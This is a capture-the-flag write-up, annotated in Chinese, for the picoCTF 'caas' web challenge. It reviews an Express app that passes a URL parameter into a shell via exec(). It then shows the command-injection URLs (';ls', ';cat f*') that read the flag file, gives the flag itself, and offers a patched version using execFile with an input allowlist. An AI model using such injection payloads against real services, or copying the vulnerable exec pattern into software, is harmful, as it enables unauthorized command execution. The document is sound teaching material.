---
title: 'picoCTF: caas Writeup'
disqus: hackmd
---

picoCTF: caas Writeup
===


## Table of Contents

[TOC]

## Topic

### Lab
#### picoCTF: 
https://play.picoctf.org/practice/challenge/202?category=1&page=1&search=caas

### Initial Enumeration

●Start Machine: \
https://caas.mars.picoctf.net/ \
![image](https://hackmd.io/_uploads/Hkeunxd8R.png)


## Solution

### 1. Attempt
```
https://caas.mars.picoctf.net/cowsay/chw
```
![image](https://hackmd.io/_uploads/HycdAxu8R.png)


### 2. Code Review
index.js
```javascript=
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});

```
> 1. express 伺服器框架
> 2. exec 使用 child_process 執行命令
> 3. {req.params.message} 直接丟進Shell 執行
> 4. Err 回應 500

### 3. Command Injection
>[!Note]
> ; 用分號閉合req.params.message，接著注入指令
```
https://caas.mars.picoctf.net/cowsay/chw;%20ls
```
![image](https://hackmd.io/_uploads/HkwclbOI0.png)
```
 _____
< chw >
 -----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
> 成功 RCE\
> 開啟falg.txt

### 4. Get Flag 
```
https://caas.mars.picoctf.net/cowsay/chw;%20cat%20f*
```
![image](https://hackmd.io/_uploads/SkwGbWu8A.png)

> **FLAG: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**

## Vulnerability causes
在執行 cowsay command，會進到:
```javascript=8
 exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) =>
```
>[!Important]
> user payload 沒有經過驗證或參數化，直接進到 ${req.params.message}\
> exec function 會直接透過 shell 來執行

既然能夠直接透過 shell 執行， 就能使用`;`、`&&`、`|`閉合前面指令

- 依照上面writeup:
在 shell 中，payload 會被解讀成兩個指令:
1. /usr/games/cowsay chw
2. ls (or cat f*)


## Patch
參數化後，使用正規表達式:
```javascript=
const express = require('express');
const app = express();
const { execFile } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  const message = req.params.message;
  if (/^[a-zA-Z0-9 .,?!-]+$/.test(message)) {
    execFile('/usr/games/cowsay', [message], {timeout: 5000}, (error, stdout) => {
      if (error) return res.status(500).end();
      res.type('txt').send(stdout).end();
    });
  } else {
    res.status(400).send('Invalid input').end();
  }
});

app.listen(3000, () => {
  console.log('listening');
});

```
> 1. 將 req.params.message 參數化: message
> 2. 參數 message 需符合正規表達式: `^[a-zA-Z0-9 .,?!-]+$`\
> 只會包含字母、數字和基本標點符號
> 3. execFile 取代 exec

>[!Note]
> **exec**:
> 直接透過 shell 執行指令，可以執行任何 shell command
> 
> **execFile**:
> 執行具體的可執行文件 (ex. message)，不會透過 shell


###### tags: `Web` `CTF` `Webshell` 
